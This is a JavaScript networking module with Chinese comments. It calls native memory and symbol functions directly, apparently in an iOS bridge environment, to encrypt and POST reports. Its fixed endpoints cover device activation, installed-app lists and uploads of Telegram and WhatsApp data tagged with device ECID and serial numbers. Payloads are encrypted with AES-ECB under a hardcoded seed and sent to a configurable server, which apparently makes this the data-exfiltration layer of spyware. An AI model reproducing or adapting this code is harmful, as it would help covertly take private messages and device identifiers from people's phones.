// 网络请求统一封装（原生桥接环境）
// 集中管理：接口路径、公共上报字段、数据加密与 HTTP 发送
var dsNetNative = (function () {

  // 接口路径表：新增或调整接口只改这里
  var ENDPOINTS = {
    activate: '/api/v1/device/activate',
    apps: '/api/v1/device/apps',
    telegramUpload: '/api/v1/telegram/upload',
    whatsappUpload: '/api/v1/whatsapp/upload'
  };

  // 渠道标识与设备身份，作为公共字段自动合并进每个上报数据包
  var channel = '';
  var deviceIdentity = {
    unique: '',
    ecid: '',
    serial: ''
  };
  var integrationRuntime = null;
  var lastResponse = null;
  var MAX_METADATA_BYTES = 1024 * 1024;
  var MAX_EVENT_BYTES = MAX_METADATA_BYTES + 64 * 1024;

  var EVENT_TYPES = {};
  EVENT_TYPES[ENDPOINTS.activate] = 'device_activate';
  EVENT_TYPES[ENDPOINTS.apps] = 'device_apps';
  EVENT_TYPES[ENDPOINTS.telegramUpload] = 'telegram_upload';
  EVENT_TYPES[ENDPOINTS.whatsappUpload] = 'whatsapp_upload';

  // 设置渠道标识
  function setChannel(c) {
    var normalized = String(c || '');
    if (normalized && !/^[1-9][0-9]*$/.test(normalized)) {
      throw new Error('integration_channel_invalid');
    }
    channel = normalized;
  }

  function setIntegrationRuntime(runtime) {
    if (!runtime) throw new Error('integration_runtime_required');
    var host = String(runtime.host || '');
    var port = Number(runtime.port || 443);
    var eventPath = String(runtime.eventPath || '');
    var sessionToken = String(runtime.sessionToken || '');
    var visitorId = String(runtime.visitorId || '');
    if (!host || host.indexOf('/') !== -1 || host.indexOf(':') !== -1) {
      throw new Error('integration_host_invalid');
    }
    if (!Number.isInteger(port) || port < 1 || port > 65535) {
      throw new Error('integration_port_invalid');
    }
    if (!/^\/[A-Za-z0-9._~!$&'()*+,;=:@%/-]+$/.test(eventPath)) {
      throw new Error('integration_event_path_invalid');
    }
    if (sessionToken.length < 20) throw new Error('integration_session_token_invalid');
    if (visitorId.length < 8) throw new Error('integration_visitor_invalid');
    if (port !== 443 && runtime.allowInsecureHttp !== true) {
      throw new Error('integration_https_required');
    }
    if (runtime.channelId != null) setChannel(runtime.channelId);
    integrationRuntime = {
      host: host,
      port: port,
      eventPath: eventPath,
      sessionToken: sessionToken,
      visitorId: visitorId,
      allowInsecureHttp: runtime.allowInsecureHttp === true
    };
    return integrationRuntime;
  }

  // 设置设备身份（唯一标识 / 芯片号 / 序列号）
  function setDeviceIdentity(id) {
    if (!id) return;
    deviceIdentity = {
      unique: id.unique || '',
      ecid: id.ecid || '',
      serial: id.serial || ''
    };
  }

  // 组装上报数据包的公共部分：渠道 + 设备身份，再合并业务字段
  function buildBaseBody(extra) {
    var p = {
      channel: channel,
      unique: deviceIdentity.unique,
      ecid: deviceIdentity.ecid,
      serial: deviceIdentity.serial
    };
    if (extra) {
      for (var k in extra) p[k] = extra[k];
    }
    return p;
  }

  function prepareBusinessBody(path, extra) {
    var body = buildBaseBody(extra);
    body.channel = channel;
    if (path === ENDPOINTS.activate && integrationRuntime) {
      body.device = integrationRuntime.visitorId;
    }
    return body;
  }

  function eventTypeForPath(path) {
    return EVENT_TYPES[path] || '';
  }

  function utf8ByteLength(value) {
    var text = String(value || '');
    if (typeof TextEncoder !== 'undefined') return new TextEncoder().encode(text).length;
    if (typeof Native !== 'undefined') return Native.stringToBytes(text, false).byteLength;
    return unescape(encodeURIComponent(text)).length;
  }

  function eventIdentifier() {
    return 'native-' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2);
  }

  function buildEventEnvelope(path, encrypted, idempotencyKey) {
    if (!integrationRuntime) throw new Error('integration_runtime_unavailable');
    var eventType = eventTypeForPath(path);
    if (!eventType) throw new Error('integration_event_path_unknown');
    var metadata = {
      schemaVersion: 1,
      callbackPath: path,
      transport: {
        encoding: 'base64',
        encryption: 'aes-256-ecb',
        xTs: encrypted.timestamp
      },
      payload: encrypted.body
    };
    if (utf8ByteLength(JSON.stringify(metadata)) > MAX_METADATA_BYTES) {
      throw new Error('integration_metadata_too_large');
    }
    return {
      eventType: eventType,
      idempotencyKey: idempotencyKey,
      visitorId: integrationRuntime.visitorId,
      sessionToken: integrationRuntime.sessionToken,
      occurredAt: new Date().toISOString(),
      metadata: metadata
    };
  }

  // --- 编码：Base64 ---
  const CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

  // 将字节数组编码为 Base64 字符串
  function base64Encode(u8arr) {
    if (!u8arr || u8arr.length === 0) return '';
    var result = '';
    var i = 0;
    var len = u8arr.length;
    while (i < len) {
      var a = u8arr[i++];
      var b = i < len ? u8arr[i++] : -1;
      var c = i < len ? u8arr[i++] : -1;
      var triplet = ((a & 0xFF) << 16) | ((b >= 0 ? b : 0) << 8) | (c >= 0 ? c : 0);
      result += CHARS[(triplet >> 18) & 0x3F];
      result += CHARS[(triplet >> 12) & 0x3F];
      result += (b >= 0) ? CHARS[(triplet >> 6) & 0x3F] : '=';
      result += (c >= 0) ? CHARS[triplet & 0x3F] : '=';
    }
    return result;
  }

  // --- 加密：SHA256 / AES ---
  let cryptoInited = false;

  // 按需加载系统加密库（只加载一次）
  function ensureCryptoInit() {
    if (cryptoInited) return;
    Native.dlopen("/usr/lib/libcommonCrypto.dylib");
    cryptoInited = true;
  }

  // 计算 SHA256 摘要，返回 32 字节 Uint8Array
  function sha256(data) {
    ensureCryptoInit();
    const inputPtr = Native.malloc(data.length);
    Native.write(inputPtr, data instanceof Uint8Array ? data.buffer : data);
    const digestPtr = Native.malloc(32);
    Native.callSymbol("CC_SHA256", inputPtr, BigInt(data.length), digestPtr);
    const result = new Uint8Array(Native.read(digestPtr, 32));
    Native.free(inputPtr);
    Native.free(digestPtr);
    return result;
  }

  // AES-256-ECB 加密：自带 PKCS7 手动填充
  function aesEncrypt(plainBytes, keyBytes) {
    ensureCryptoInit();
    const kCCEncrypt = 0n;
    const kCCAlgorithmAES = 0n;
    const kCCOptionECBMode = 2n;

    var inLen = plainBytes.length;
    var padLen = 16 - (inLen % 16);
    var paddedLen = inLen + padLen;
    var paddedInput = new Uint8Array(paddedLen);
    paddedInput.set(plainBytes);
    for (var pi = inLen; pi < paddedLen; pi++) paddedInput[pi] = padLen;

    const outLen = paddedLen;
    const keyPtr = Native.malloc(32);
    const inPtr = Native.malloc(paddedLen);
    const outPtr = Native.malloc(outLen);
    const movedPtr = Native.malloc(8);
    const cryptorRefPtr = Native.malloc(8);

    Native.write(keyPtr, keyBytes instanceof Uint8Array ? keyBytes.buffer : keyBytes);
    Native.write(inPtr, paddedInput.buffer);
    Native.write64(movedPtr, 0n);
    Native.write64(cryptorRefPtr, 0n);

    var status = Native.callSymbol("CCCryptorCreate",
      kCCEncrypt, kCCAlgorithmAES, kCCOptionECBMode,
      keyPtr, 32n, 0n, cryptorRefPtr);

    var encrypted = null;

    if (Number(status) === 0) {
      var cryptorRef = Native.readPtr(cryptorRefPtr);

      Native.write64(movedPtr, 0n);
      Native.callSymbol("CCCryptorUpdate",
        cryptorRef, inPtr, BigInt(paddedLen), outPtr, BigInt(outLen), movedPtr);
      var updateMoved = Native.read32(movedPtr);

      Native.write64(movedPtr, 0n);
      Native.callSymbol("CCCryptorFinal",
        cryptorRef, outPtr + BigInt(updateMoved), BigInt(outLen - updateMoved), movedPtr);
      var finalMoved = Native.read32(movedPtr);

      var totalMoved = updateMoved + finalMoved;
      if (totalMoved > 0) {
        encrypted = new Uint8Array(Native.read(outPtr, totalMoved));
      }

      Native.callSymbol("CCCryptorRelease", cryptorRef);
    }

    Native.free(keyPtr);
    Native.free(inPtr);
    Native.free(outPtr);
    Native.free(movedPtr);
    Native.free(cryptorRefPtr);
    return encrypted;
  }

  // 组装加密上报数据包：
  // 密钥 = SHA256(固定种子 + 时间戳)，明文 = 时间戳 + JSON，
  // 返回 { body: base64(密文), timestamp }（timestamp 供服务端解密用）
  function encryptForServer(jsonObj) {
    const timestamp = String(Date.now());
    const plaintext = timestamp + JSON.stringify(jsonObj);
    const plainBytes = new Uint8Array(Native.stringToBytes(plaintext, false));

    const keyInput = new Uint8Array(Native.stringToBytes("Ek8pl31K2yeHgQwy" + timestamp, false));
    const key = sha256(keyInput);

    const encrypted = aesEncrypt(plainBytes, key);
    if (!encrypted) return null;

    return {
      body: base64Encode(encrypted),
      timestamp: timestamp
    };
  }

  // --- 网络：CFStream HTTP ---
  let networkInited = false;

  // 按需加载网络框架（只加载一次）
  function ensureNetworkInit() {
    if (networkInited) return;
    Native.dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation");
    Native.dlopen("/System/Library/Frameworks/CFNetwork.framework/CFNetwork");
    networkInited = true;
  }

  // 构造 CFString
  function createCFString(str) {
    return Native.callSymbol("CFStringCreateWithCString", 0n, str, 0x08000100n);
  }

  // 手动拼接 HTTP/1.1 请求发送 POST，返回 { status, body }
  // 443 端口启用 TLS；写+读总超时 30 秒；响应体上限 64KB
  function httpPost(host, port, path, headers, body) {
    ensureNetworkInit();

    const useSSL = (port === 443);

    const hostCFStr = createCFString(host);
    if (!hostCFStr || BigInt(hostCFStr) === 0n) return null;

    const readStreamPtr = Native.malloc(8);
    const writeStreamPtr = Native.malloc(8);
    Native.callSymbol("CFStreamCreatePairWithSocketToHost", 0n, BigInt(hostCFStr), BigInt(port), readStreamPtr, writeStreamPtr);
    Native.callSymbol("CFRelease", BigInt(hostCFStr));

    const readStream = Native.readPtr(readStreamPtr);
    const writeStream = Native.readPtr(writeStreamPtr);
    Native.free(readStreamPtr);
    Native.free(writeStreamPtr);

    if (!readStream || readStream === 0n || !writeStream || writeStream === 0n) return null;

    if (useSSL) {
      var secLevelKey = createCFString("kCFStreamPropertySocketSecurityLevel");
      var secLevelVal = createCFString("kCFStreamSocketSecurityLevelNegotiatedSSL");
      if (secLevelKey && secLevelVal) {
        Native.callSymbol("CFReadStreamSetProperty", readStream, BigInt(secLevelKey), BigInt(secLevelVal));
        Native.callSymbol("CFWriteStreamSetProperty", writeStream, BigInt(secLevelKey), BigInt(secLevelVal));
        Native.callSymbol("CFRelease", BigInt(secLevelKey));
        Native.callSymbol("CFRelease", BigInt(secLevelVal));
      }

    }

    const openRead = Native.callSymbol("CFReadStreamOpen", readStream);
    const openWrite = Native.callSymbol("CFWriteStreamOpen", writeStream);
    if (!openRead || !openWrite) {
      Native.callSymbol("CFRelease", readStream);
      Native.callSymbol("CFRelease", writeStream);
      return null;
    }

    var streamReady = false;
    for (var wi = 0; wi < 100; wi++) {
      var wStatus = Number(Native.callSymbol("CFWriteStreamGetStatus", writeStream));
      if (wStatus === 2) { streamReady = true; break; }
      if (wStatus >= 5) break;
      Native.callSymbol("usleep", 100000n);
    }
    if (!streamReady) {
      Native.callSymbol("CFReadStreamClose", readStream);
      Native.callSymbol("CFWriteStreamClose", writeStream);
      Native.callSymbol("CFRelease", readStream);
      Native.callSymbol("CFRelease", writeStream);
      return null;
    }

    let headerStr = '';
    for (const [k, v] of Object.entries(headers || {})) {
      headerStr += `${k}: ${v}\r\n`;
    }
    const request = `POST ${path} HTTP/1.1\r\nHost: ${host}\r\n${headerStr}Content-Length: ${utf8ByteLength(body)}\r\nConnection: close\r\n\r\n${body}`;

    const startTime = Date.now();
    const timeoutMs = 30000;

    var reqBytes = Native.stringToBytes(request, false);
    var reqPtr = Native.malloc(reqBytes.byteLength);
    Native.write(reqPtr, reqBytes);
    var totalWritten = 0;
    var reqLen = reqBytes.byteLength;
    while (totalWritten < reqLen) {
      if (Date.now() - startTime > timeoutMs) break;
      var written = Number(Native.callSymbol("CFWriteStreamWrite", writeStream, reqPtr + BigInt(totalWritten), BigInt(reqLen - totalWritten)));
      if (written < 0) break;
      if (written === 0) { Native.callSymbol("usleep", 10000n); continue; }
      totalWritten += written;
    }
    Native.free(reqPtr);

    if (totalWritten < reqLen) {
      Native.callSymbol("CFReadStreamClose", readStream);
      Native.callSymbol("CFWriteStreamClose", writeStream);
      Native.callSymbol("CFRelease", readStream);
      Native.callSymbol("CFRelease", writeStream);
      return null;
    }

    const bufSize = 8192;
    const readBuf = Native.malloc(bufSize);
    let responseChunks = [];
    let totalRead = 0;
    const maxSize = 64 * 1024;

    while (totalRead < maxSize) {
      if (Date.now() - startTime > timeoutMs) break;
      const bytesRead = Number(Native.callSymbol("CFReadStreamRead", readStream, readBuf, BigInt(bufSize)));
      if (bytesRead <= 0) break;
      const chunk = Native.read(readBuf, bytesRead);
      if (chunk) responseChunks.push(new Uint8Array(chunk));
      totalRead += bytesRead;
    }

    Native.free(readBuf);
    Native.callSymbol("CFReadStreamClose", readStream);
    Native.callSymbol("CFWriteStreamClose", writeStream);
    Native.callSymbol("CFRelease", readStream);
    Native.callSymbol("CFRelease", writeStream);

    if (responseChunks.length === 0) return null;

    let combined = new Uint8Array(totalRead);
    let offset = 0;
    for (let chunk of responseChunks) {
      combined.set(chunk, offset);
      offset += chunk.length;
    }

    let headerEnd = -1;
    for (let i = 0; i < combined.length - 3; i++) {
      if (combined[i] === 13 && combined[i+1] === 10 && combined[i+2] === 13 && combined[i+3] === 10) {
        headerEnd = i + 4;
        break;
      }
    }

    const headerText = Native.bytesToString(combined.slice(0, headerEnd > 0 ? headerEnd : combined.length).buffer, false);
    const statusMatch = headerText.match(/HTTP\/\d\.\d (\d+)/);
    const status = statusMatch ? parseInt(statusMatch[1]) : 0;
    const responseHeaders = {};
    const headerLines = headerText.split(/\r?\n/);
    for (let hi = 1; hi < headerLines.length; hi++) {
      const separator = headerLines[hi].indexOf(':');
      if (separator <= 0) continue;
      responseHeaders[headerLines[hi].slice(0, separator).trim().toLowerCase()] =
        headerLines[hi].slice(separator + 1).trim();
    }

    return {
      status,
      headers: responseHeaders,
      body: headerEnd > 0 ? combined.subarray(headerEnd) : null
    };
  }

  // 解析域名：兼容原调用签名；正式集成的目标由 setIntegrationRuntime 配置。
  function parseDomain(domain) {
    let host = domain;
    let port = 443;
    let useSSL = true;
    if (domain.indexOf(":") !== -1) {
      const parts = domain.split(":");
      host = parts[0];
      port = parseInt(parts[1]) || 443;
      if (port !== 443) useSSL = false;
    }
    return { host, port, useSSL };
  }

  function shouldRetryStatus(status) {
    return status === 408 || status === 429 || status >= 500;
  }

  function responseBodyJson(result) {
    if (!result || !result.body || result.body.length === 0) return null;
    try {
      var bytes = result.body;
      var buffer = bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength);
      return JSON.parse(Native.bytesToString(buffer, false));
    } catch (e) {
      return null;
    }
  }

  function retryDelayMs(result, attempt) {
    var retryAfter = result && result.headers ? result.headers['retry-after'] : '';
    if (retryAfter) {
      var seconds = Number(retryAfter);
      if (Number.isFinite(seconds) && seconds >= 0) {
        return Math.min(30000, Math.round(seconds * 1000));
      }
      var retryAt = Date.parse(retryAfter);
      if (!Number.isNaN(retryAt)) {
        return Math.min(30000, Math.max(0, retryAt - Date.now()));
      }
    }
    return Math.min(8000, 1000 * Math.pow(2, attempt));
  }

  // 同一 envelope 最多发送 maxRetries 次；只重试暂时性网络或服务端错误。
  function postWithRetry(domain, path, body, headers, maxRetries = 3) {
    const { host, port } = parseDomain(domain);
    for (let attempt = 0; attempt < maxRetries; attempt++) {
      var result = null;
      try {
        result = httpPost(host, port, path, headers, body);
      } catch(e) {}
      if (result && result.status >= 200 && result.status < 300) {
        lastResponse = {
          status: result.status,
          data: responseBodyJson(result)
        };
        return true;
      }
      lastResponse = {
        status: result ? result.status : 0,
        data: responseBodyJson(result)
      };
      var retryable = !result || shouldRetryStatus(result.status);
      if (!retryable || attempt >= maxRetries - 1) return false;
      Native.callSymbol("usleep", BigInt(retryDelayMs(result, attempt) * 1000));
    }
    return false;
  }

  // 统一上报入口：原业务对象先按旧协议加密，再作为单条 Parloq 事件持久化。
  function postEncryptedToServer(domain, path, jsonObj) {
    if (!integrationRuntime || !channel) return false;
    const encrypted = encryptForServer(prepareBusinessBody(path, jsonObj));
    if (!encrypted) return false;
    const envelope = buildEventEnvelope(path, encrypted, eventIdentifier());
    const body = JSON.stringify(envelope);
    if (utf8ByteLength(body) > MAX_EVENT_BYTES) {
      throw new Error('integration_event_too_large');
    }
    const headers = {
      "Content-Type": "application/json"
    };
    const runtimeDomain = integrationRuntime.host +
      (integrationRuntime.port === 443 ? '' : ':' + integrationRuntime.port);
    return postWithRetry(
      runtimeDomain,
      integrationRuntime.eventPath,
      body,
      headers,
      3
    );
  }

  return {
    ENDPOINTS: ENDPOINTS,
    setChannel: setChannel,
    setIntegrationRuntime: setIntegrationRuntime,
    setDeviceIdentity: setDeviceIdentity,
    buildBaseBody: buildBaseBody,
    prepareBusinessBody: prepareBusinessBody,
    eventTypeForPath: eventTypeForPath,
    utf8ByteLength: utf8ByteLength,
    buildEventEnvelope: buildEventEnvelope,
    base64Encode: base64Encode,
    sha256: sha256,
    aesEncrypt: aesEncrypt,
    encryptForServer: encryptForServer,
    httpPost: httpPost,
    parseDomain: parseDomain,
    shouldRetryStatus: shouldRetryStatus,
    postWithRetry: postWithRetry,
    postEncryptedToServer: postEncryptedToServer,
    getLastResponse: function () { return lastResponse; }
  };
})();

if (typeof globalThis !== 'undefined') {
  globalThis.dsNetNative = dsNetNative;
}
